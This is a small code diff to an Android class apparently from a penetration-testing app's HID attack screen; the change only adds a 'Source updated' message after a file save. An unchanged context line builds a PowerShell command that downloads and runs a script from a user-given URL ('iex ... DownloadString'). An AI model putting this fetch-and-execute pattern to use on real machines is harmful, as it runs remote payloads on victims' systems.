@@ -368,7 +368,9 @@ public class HidFragment extends Fragment {
                 String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " + newString;
 
                 boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
-                if (!isSaved) {
+                if (isSaved) {
+                    NhPaths.showMessage(context, "Source updated");
+                } else {
                     NhPaths.showMessage(context, "Source not updated (configFileUrlPath)");
                 }
             } else {
